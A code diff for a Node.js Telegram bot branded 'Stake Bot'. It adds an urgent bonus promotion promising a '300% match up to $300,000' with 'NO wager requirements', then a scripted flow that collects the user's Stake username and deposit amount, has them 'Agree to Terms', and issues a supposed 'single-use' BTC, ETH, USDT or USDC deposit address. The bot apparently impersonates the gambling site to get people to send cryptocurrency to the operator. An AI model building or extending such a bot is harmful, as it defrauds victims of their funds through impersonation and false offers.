@@ -9,8 +9,7 @@ bot.onText(/\/start/, (msg) => {
   const chatId = msg.chat.id;
 
   // Send subscription confirmation messages
-  bot.sendMessage(chatId, "Congratulations! You subscribed to Stake Bot.\n\nUse /off to pause your subscription.");
-  bot.sendMessage(chatId, "Want to create your own bot?\nGo to @Manybot",{
+  bot.sendMessage(chatId, "Congratulations! You subscribed to Stake Bot.\n\nUse /off to pause your subscription.",{
     reply_markup: {
       keyboard: [
         ["💎 Claim Deposit Offer 💎"],
@@ -31,9 +30,20 @@ bot.on('message', (msg) => {
   if (text.startsWith('/')) return;
 
   if (text === "💎 Claim Deposit Offer 💎") {
-    bot.sendPhoto(chatId, "public/pic.jpg")
+    bot.sendPhoto(chatId, "public/pic.jpg", {}, { contentType: "image/jpeg" })
+
       .then(() => {
-        bot.sendMessage(chatId, "🚨 Bonus Drop Alert 🚨\n\nAs promised, would give you a HUGE drop! 🎁\n\nIt's officially the month of good! Here's another offer boost to show how much we love our amazing players!\nNote: both new AND existing users may claim these offers\n\n💎 300% match up to $300.000\n🚫 No Wager Requirements\n📅 Expires Feb 28st at 11:59PM UTC\n\n🚀 Users who claim and deposit $10,000 or more will receive the benefit of an exclusive VIP Host and personalized bonuses for 7 calendar days!\nIf you already have a VIP Host, you'll receive an additional 50% deposit match instead.\n\nClick Claim Deposit Offer for more details", {
+        bot.sendMessage(chatId, "🚨 Bonus Drop Alert 🚨\n\n" +
+        "The month of March has started, which means we owe you a sweet deposit bonus! This monthly bonus seems to be our most requested so far. 😎\n\n" +
+        "It's officially the month of good! Here's another offer boost to show how much we love our amazing players!\n" +
+        "*Note:* both *new* AND *existing* users may claim these offers\n\n" +
+        "💎 *300% match up to $300,000*\n" +
+        "🚫 *No Wager Requirements*\n" +
+        "📅 *Expires March 7th at 11:59PM UTC*\n\n" +
+        "✅ You read that right, *NO wager requirements!* Players may withdraw the full amount immediately (if they wish!)\n\n" +
+        "🚀 *Users who claim and deposit $10,000 or more* will receive the benefit of an *exclusive VIP Host* and *personalized bonuses for 7 calendar days!*\n" +
+        "If you already have a *VIP Host*, you'll receive an *additional 50% deposit match instead.*\n\n" +
+        "👉 Click *Claim Deposit Offer* for more details.", {
           reply_markup: {
             keyboard: [
               ["Claim Deposit Offer"],
@@ -43,6 +53,20 @@ bot.on('message', (msg) => {
           }
         });
       });
+  }
+
+  if (text === "Cancel" || text === "Go Back") {  
+    bot.sendMessage(chatId, "Main Menu", {
+      reply_markup: {
+        keyboard: [
+          ["💎 Claim Deposit Offer 💎"],
+          ["🎟️ Raffle 🎟️"],
+          ["🔎Channel Directory🔎"]
+        ],
+        resize_keyboard: true,
+        input_field_placeholder: "Write a message..."
+      }
+    });
   }
 
   if (text === "Claim Deposit Offer") {
@@ -57,6 +81,100 @@ bot.on('message', (msg) => {
     });
   }
   
+  if (text === "Stake.com /Others" || text === "Stake.us") { 
+    bot.sendMessage(chatId, "What is your Stake username? (type below)", {
+      reply_markup: {
+        keyboard: [["Cancel"]],
+        resize_keyboard: true
+      }
+    });
+
+    bot.once("message", (msg) => {
+      if (msg.text !== "Cancel") {
+        bot.sendMessage(chatId, 
+          "How much (in USD) would you like to deposit?\n" +
+          "(Type your answer below)\n\n" +
+          "Please respond with numbers only, no symbols please.\n" +
+          "For example: 1000"
+        );
+
+        bot.once("message", (amountMsg) => {
+          if (!isNaN(amountMsg.text)) {
+            bot.sendMessage(chatId, "Done!", {
+              reply_markup: {
+                keyboard: [
+                  ["Deposit Crypto"],
+                  ["Go Back"]
+                ],
+                resize_keyboard: true
+              }
+            });
+
+            bot.once("message", (depositMsg) => {
+              if (depositMsg.text === "Deposit Crypto") {
+                bot.sendMessage(chatId,
+                  "Thank you, I will now retrieve a single-use address associated with the Stake username you provided, to facilitate our deposit match with no wager requirements.\n\n" +
+                  "- Your deposit will appear in your Transactions page after 1 confirmation is reached.\n" +
+                  "- Please note, any future deposits made to this address will be credited to your account, but will not receive a deposit match.\n" +
+                  "- After clicking the \"Proceed\" button below, you will be given the option to \"Agree to Terms.\" By agreeing to terms, you confirm that you've read and understood this message.\n\n" +
+                  "‼️ Please ensure that the username you provided is correct. If not, please click \"Cancel\" and restart the process.",
+                  {
+                    reply_markup: {
+                      keyboard: [
+                        ["Proceed"],
+                        ["Go Back"]
+                      ],
+                      resize_keyboard: true
+                    }
+                  }
+                );
+
+                bot.once("message", (proceedMsg) => {
+                  if (proceedMsg.text === "Proceed") {
+                    bot.sendMessage(chatId, "‼️ You must click \"Agree to Terms\" to continue", {
+                      reply_markup: {
+                        keyboard: [
+                          ["Agree to Terms"],
+                          ["Go Back"]
+                        ],
+                        resize_keyboard: true
+                      }
+                    });
+
+                    bot.once("message", (agreeMsg) => {
+                      if (agreeMsg.text === "Agree to Terms") {
+                        bot.sendMessage(chatId, "Done! ✅\nChoose your cryptocurrency 👇🏼", {
+                          reply_markup: {
+                            keyboard: [
+                              ["BTC"], ["ETH"],
+                              ["USDT"], ["USDC"]
+                            ],
+                            resize_keyboard: true
+                          }
+                        });
+                        bot.on("message", (cryptoMsg) => {
+                          let cryptoName = cryptoMsg.text;
+                          if (["BTC", "ETH", "USDT", "USDC"].includes(cryptoName)) {
+                            bot.sendMessage(cryptoMsg.chat.id, 
+                              `Stake Bonus:\nYour single-use (${cryptoName}) address is below.\n\n⚠️ After you have sent your deposit, please click the following: \n\n/Complete`
+                            );
+                          }
+                        });
+                        
+                        
+                      }
+                    });
+                  }
+                });
+              }
+            });
+          } 
+        });
+      }
+    });
+}
+
+
   if (text === "🎟️ Raffle 🎟️") {
     bot.sendMessage(chatId, "Sorry, there is no active raffle at the moment!");
   }
